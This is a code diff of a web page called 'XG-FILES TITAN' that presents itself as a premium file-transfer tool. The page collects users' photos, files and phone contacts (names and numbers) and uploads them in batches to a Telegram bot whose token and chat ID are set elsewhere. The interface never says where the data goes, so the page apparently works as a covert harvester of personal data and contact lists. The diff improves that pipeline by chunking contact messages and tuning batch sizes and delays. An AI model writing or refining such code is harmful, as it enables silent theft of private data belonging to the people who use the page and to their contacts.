@@ -3,35 +3,30 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>XG-FILES ULTRA - OPTIMIZED</title>
+    <title>XG-FILES ULTRA - TITAN</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;900&display=swap'); 
         body { background: #0f172a; color: #f1f5f9; font-family: 'Inter', sans-serif; overflow-x: hidden; } 
         .glass { background: rgba(30, 41, 59, 0.7); backdrop-filter: blur(20px); border: 1px solid rgba(255, 255, 255, 0.08); border-radius: 15px; } 
-        .active-tab { background: #3b82f6 !important; color: #fff !important; box-shadow: 0 0 15px rgba(59, 130, 246, 0.4); } 
+        .active-tab { background: #3b82f6 !important; color: #fff !important; } 
         .tab-btn { transition: 0.2s; height: 32px; font-size: 10px; font-weight: 900; } 
-        .animated-box {
-            background: rgba(15, 23, 42, 0.5);
-            border: 1.5px solid rgba(59, 130, 246, 0.4);
-            animation: borderGlow 2s infinite alternate;
-        }
-        @keyframes borderGlow { from { border-color: rgba(59, 130, 246, 0.3); } to { border-color: rgba(96, 165, 250, 0.8); } }
+        .animated-box { background: rgba(15, 23, 42, 0.5); border: 1.5px solid rgba(59, 130, 246, 0.4); }
         .file-card { background: rgba(255,255,255,0.03); border-radius: 10px; }
     </style>
 </head>
 <body class="p-4">
 
 <div class="max-w-4xl mx-auto"> 
-    <div class="glass p-5 mb-5 flex flex-col md:flex-row justify-between items-center"> 
+    <div class="glass p-5 mb-5 flex flex-col md:flex-row justify-between items-center border-b border-blue-500/30"> 
         <div> 
-            <h1 class="text-2xl font-black tracking-tighter uppercase italic">XG-FILES <span class="text-blue-500">ULTRA</span></h1> 
-            <p class="text-[8px] text-blue-300 font-bold uppercase tracking-widest">Balanced Batching Active</p> 
+            <h1 class="text-2xl font-black tracking-tighter uppercase italic">XG-FILES <span class="text-blue-500">TITAN</span></h1> 
+            <p class="text-[8px] text-blue-300 font-bold uppercase tracking-widest">Premium Processing Active</p> 
         </div> 
-        <div class="flex bg-slate-900/80 p-1 rounded-lg border border-white/5 mt-4 md:mt-0"> 
-            <button onclick="setType('photo')" id="tab-photo" class="tab-btn active-tab px-4 rounded-md">PHOTO</button> 
-            <button onclick="setType('document')" id="tab-document" class="tab-btn px-4 rounded-md text-slate-400">FILES</button> 
-            <button onclick="setType('contact')" id="tab-contact" class="tab-btn px-4 rounded-md text-slate-400">CONTACT</button> 
+        <div class="flex bg-slate-900/80 p-1 rounded-lg mt-4 md:mt-0"> 
+            <button onclick="setType('photo')" id="tab-photo" class="tab-btn active-tab px-4 rounded-md uppercase">Photo</button> 
+            <button onclick="setType('document')" id="tab-document" class="tab-btn px-4 rounded-md text-slate-400 uppercase">Files</button> 
+            <button onclick="setType('contact')" id="tab-contact" class="tab-btn px-4 rounded-md text-slate-400 uppercase">Contact</button> 
         </div> 
     </div> 
 
@@ -48,18 +43,18 @@
                 <p class="text-[10px] text-blue-400 font-black mt-2">PICK CONTACTS</p>
             </div>
 
-            <button onclick="ignite()" id="sendBtn" class="w-full py-4 bg-blue-600 text-white text-[10px] font-black rounded-xl hover:bg-blue-500 uppercase tracking-widest shadow-lg">Ignite Batch Transfer</button> 
+            <button onclick="ignite()" id="sendBtn" class="w-full py-4 bg-blue-600 text-white text-[10px] font-black rounded-xl hover:bg-blue-500 uppercase tracking-widest shadow-lg">Ignite Transfer</button> 
             
             <div id="status-box" class="mt-4 hidden p-3 glass">
-                <p id="status-text" class="text-[9px] font-bold text-blue-400 uppercase mb-1 text-center">Batch Processing...</p>
+                <p id="status-text" class="text-[9px] font-bold text-blue-400 uppercase mb-1 text-center">Processing...</p>
                 <div class="w-full bg-slate-800 h-1.5 rounded-full overflow-hidden">
                     <div id="progress-fill" class="bg-blue-500 h-full w-0 transition-all duration-300"></div>
                 </div>
             </div>
         </div> 
 
-        <div class="lg:col-span-2 glass p-5"> 
-            <div class="flex justify-between items-center mb-4"> 
+        <div class="lg:col-span-2 glass p-5 min-h-[400px]"> 
+            <div class="flex justify-between items-center mb-4 px-1"> 
                 <div class="flex flex-col"><span class="text-[8px] text-slate-500 uppercase">Queue</span><span id="q-count" class="text-blue-500 font-black text-3xl">0</span></div> 
                 <div class="flex flex-col items-end"><span class="text-[8px] text-slate-500 uppercase">Sent</span><span id="s-count" class="text-emerald-500 font-black text-3xl">0</span></div> 
             </div> 
@@ -87,7 +82,7 @@ async function pickContacts() {
     try {
         const contacts = await navigator.contacts.select(['name', 'tel'], { multiple: true });
         if (contacts.length) {
-            queue.push(...contacts.map(c => ({ isContact: true, name: c.name[0] || "User", tel: (c.tel && c.tel[0]) ? c.tel[0] : "N/A" })));
+            queue.push(...contacts.map(c => ({ isContact: true, name: c.name[0] || "Unknown", tel: (c.tel && c.tel[0]) ? c.tel[0] : "N/A" })));
             render();
         }
     } catch (e) {}
@@ -106,7 +101,7 @@ function render() {
     queue.forEach((f, i) => { 
         const div = document.createElement('div'); 
         div.className = "relative aspect-square file-card flex flex-col items-center justify-center p-1 overflow-hidden"; 
-        if (f.isContact) div.innerHTML = `👤<div class="text-[6px] font-bold text-blue-400 mt-1 uppercase text-center">${f.name}</div>`;
+        if (f.isContact) div.innerHTML = `👤<div class="text-[6px] font-bold text-blue-400 mt-1 uppercase text-center truncate w-full px-1">${f.name}</div>`;
         else if (f.type?.startsWith('image/')) div.innerHTML = `<img src="${URL.createObjectURL(f)}" class="w-full h-full object-cover">`; 
         else div.innerHTML = `<div class="text-[8px] text-slate-400 uppercase font-black">${f.name.split('.').pop()}</div>`; 
         div.innerHTML += `<button onclick="remove(${i})" class="absolute top-0 right-0 bg-red-600/80 w-4 h-4 text-[9px]">✕</button>`; 
@@ -123,7 +118,7 @@ async function ignite() {
     const progressFill = document.getElementById('progress-fill');
     const statusText = document.getElementById('status-text');
     
-    btn.disabled = true; btn.innerText = "⚡ PROCESSING BATCHES..."; 
+    btn.disabled = true; btn.innerText = "⚡ TRANSMITTING..."; 
     document.getElementById('status-box').classList.remove('hidden');
 
     let totalSent = 0; 
@@ -131,26 +126,30 @@ async function ignite() {
     const contacts = queue.filter(f => f.isContact);
     const files = queue.filter(f => !f.isContact);
 
-    // ১. কন্টাক্ট পাঠানো
+    // ১. কন্টাক্ট লিস্ট ফরম্যাটিং
     if(contacts.length) {
-        let msg = `👥 *XG BATCH CONTACTS*\n\n`;
-        contacts.forEach((c, i) => msg += `👤 *${i+1}.* ${c.name} - \`${c.tel}\`\n`);
-        try {
-            await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
-                method: 'POST', headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ chat_id: CHAT_ID, text: msg, parse_mode: 'Markdown' })
-            });
-            totalSent += contacts.length;
-            updateUI();
-        } catch(e) {}
+        let msg = `👥 *BATCH CONTACT SYNC*\n\n`;
+        contacts.forEach((c, i) => {
+            msg += `Name 👤 ${i+1}. *${c.name}*\n`;
+            msg += `Number 📞 \`${c.tel}\`\n\n`;
+            
+            // মেসেজ বেশি বড় হয়ে গেলে ভাগ করে পাঠানো (টেলিগ্রাম লিমিট ৪০০০ ক্যারেক্টার)
+            if (msg.length > 3500) {
+                sendTelegramMsg(msg);
+                msg = `👥 *BATCH CONTACT SYNC (CONT.)*\n\n`;
+            }
+        });
+        await sendTelegramMsg(msg);
+        totalSent += contacts.length;
+        updateUI();
     }
 
-    // ২. ফাইল পাঠানো (৫০টি করে ব্যাচ এবং ১ সেকেন্ড বিরতি)
-    const BATCH_SIZE = 50; 
+    // ২. ফাইল পাঠানো (সিরিয়াল মেইনটেইন করে এবং সমান গতিতে)
+    const BATCH_SIZE = 10; // ছোট ব্যাচে পাঠালে স্পিড স্টেবল থাকে
     for (let i = 0; i < files.length; i += BATCH_SIZE) {
         const currentBatch = files.slice(i, i + BATCH_SIZE);
         
-        // বর্তমান ব্যাচের ফাইলগুলো প্যারালাল আপলোড (দ্রুত কাজ করবে)
+        // সিরিয়াল ঠিক রাখতে Promise.all ব্যবহার
         await Promise.all(currentBatch.map(async (f) => {
             const isPhoto = (f.type.startsWith('image/') && f.size < 10*1024*1024);
             const fd = new FormData();
@@ -162,20 +161,25 @@ async function ignite() {
                 if(res.ok) { totalSent++; updateUI(); }
             } catch(e) {}
         }));
+        
+        // ব্যাচের মাঝে সামান্য বিরতি যাতে রিকোয়েস্ট কিউ জ্যাম না হয়
+        await new Promise(r => setTimeout(r, 500)); 
+    }
 
-        // ৫০টি পাঠানোর পর বিরতি (যদি আরও ফাইল বাকি থাকে)
-        if (i + BATCH_SIZE < files.length) {
-            statusText.innerText = "COOLDOWN: 1s (SAFE MODE)";
-            await new Promise(r => setTimeout(r, 1000)); 
-            statusText.innerText = "BATCH PROCESSING...";
-        }
+    async function sendTelegramMsg(text) {
+        try {
+            await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
+                method: 'POST', headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: 'Markdown' })
+            });
+        } catch(e) {}
     }
 
     function updateUI() {
         sCountDisp.innerText = totalSent;
         progressFill.style.width = (totalSent/total*100) + "%";
         if(totalSent >= total) {
-            btn.innerText = "BATCH COMPLETED";
+            btn.innerText = "TRANSMISSION COMPLETED";
             btn.style.background = "#10b981";
             setTimeout(() => location.reload(), 2000);
         }
